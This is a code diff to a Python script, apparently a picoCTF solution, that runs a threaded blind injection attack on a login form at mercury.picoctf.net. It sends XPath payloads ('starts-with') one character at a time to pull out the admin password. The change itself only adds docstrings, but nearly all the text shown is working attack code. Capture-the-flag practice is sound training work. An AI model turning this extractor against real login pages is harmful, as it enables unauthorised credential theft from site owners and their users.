@@ -4,6 +4,7 @@ import threading
 URL = "http://mercury.picoctf.net:53735/"
 
 def thread(func):
+    '''thread decorator'''
     def wrapper(*args, **kwargs):
         thread = threading.Thread(target=func, args=args, kwargs=kwargs)
         thread.start()
@@ -18,6 +19,7 @@ class Blind_SQLI:
     
     @thread
     def send_requests_sqli(self, char):
+        '''Send all `requests.get()`+SQLI payload to the target server.'''
         data={"name": "admin", "pass": f"' or //*[starts-with(text(),'{self.seenChar+char}')] or '1'='"}
         req = requests.post(self.url, data=data)
         if "You&#39;re on the right path." in req.text:
@@ -26,6 +28,7 @@ class Blind_SQLI:
         print(f"Not found char: {self.seenChar+char}", end="\r")
         
     def start(self):
+        '''Start the SQLI attack.'''
         while True:
             for i in self.charList:
                 self.send_requests_sqli(i)
@@ -35,6 +38,4 @@ class Blind_SQLI:
                     thread.join()
             print(f"Found char: {self.seenChar}")
             
-            
-
 Blind_SQLI().start()
